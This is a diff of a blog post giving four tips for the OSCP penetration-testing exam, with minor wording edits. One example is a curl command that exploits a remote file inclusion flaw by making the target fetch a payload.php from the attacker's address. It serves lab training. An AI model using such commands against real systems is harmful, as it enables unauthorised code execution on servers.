@@ -1,10 +1,10 @@
 # Four OSCP Tips
 
-I completed all five OSCP exam machines in 9.5 hours and I did not use Metasploit. Here are four tips that will help you pass your OSCP exam:
+I completed all five OSCP exam machines in 9.5 hours and I did not use Metasploit. Here are four tips that will help you to pass your OSCP exam:
 
 ## 1. Tame your terminal
 
-Export variables and set aliases for commands that you will frequently use in your `.bashrc` file. I recommend the following: 
+Export variables and set aliases in `~/.bashrc` for commands that you will frequently. I recommend the following: 
 * Store your OSCP lab and exam content on your host machine and share it with your PWK virtual machine using VMWare's shared folders feature. Use the following alias to conveniently mount the shared drives inside of the virtual machine: 
 	```
 	alias "mount-shared-folders=
@@ -24,7 +24,7 @@ Export variables and set aliases for commands that you will frequently use in yo
 	```
 	source ~/.bashrc
 	```
-	Example: use the following to exploit an RFI vulnerability (the unicorns of web application hacking):
+	Example: use these variables to exploit an RFI vulnerability (the unicorns of web application hacking):
 	```
 	curl "http://$targ/vuln_page.php?file=http://$tun0:8888/payload.php"
 	```
@@ -34,7 +34,7 @@ Export variables and set aliases for commands that you will frequently use in yo
 	alias "c=xclip -selection clipboard"
 	alias "v=xclip -o -selection clipboard"
 	```
-	Example: use the following to review a `searchsploit` result:
+	Example: use this alias to review a `searchsploit` result:
 	```
 	locate windows/remote/1.c | c ; less `v`
 	```
@@ -53,9 +53,9 @@ While completing the PWK exercises and labs you will learn essential offensive s
 
 ## 4. Make your own cheat sheets
 Every J. Random Hacker has published an OSCP cheat sheet:
-![Google cheat sheet result count](google_cheat_sheet_count.png)
-and their work is helpful to you but not nearly as helpful as creating your own. I recommend that you create at least 3 documents as you progress through the PWK exercises and lab machines. The following are snippets from the three cheat sheets that I recommend you develop:
-1. An enumeration cheat sheet:
+[Google cheat sheet result count](google_cheat_sheet_count.png)
+and their work is helpful to you but not nearly as helpful as creating your own. I recommend that you create at least 3 documents as you progress through the PWK exercises and lab machines. The following are snippets from the three cheat sheets that I created:
+	1. An enumeration cheat sheet:
 	```
 	PORT SCAN
 	=========
